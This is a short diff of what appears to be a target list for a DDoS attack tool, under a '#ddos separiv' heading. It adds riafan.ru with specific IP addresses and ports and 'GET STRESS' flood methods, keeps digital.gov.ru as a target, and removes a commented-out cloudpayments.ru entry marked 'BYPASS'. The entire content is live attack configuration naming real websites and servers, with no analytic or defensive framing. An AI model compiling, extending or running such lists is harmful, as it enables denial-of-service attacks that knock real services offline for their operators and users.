@@ -18,5 +18,5 @@ https://digital.gov.ru/ tcp://212.164.137.119:80 tcp://212.164.137.119:443 --htt
 
 #ddos separiv
 
+https://riafan.ru tcp://178.248.238.21:80 tcp://178.248.238.21:443 --http-methods GET STRESS
 
-#https://cloudpayments.ru --http-methods BYPASS 
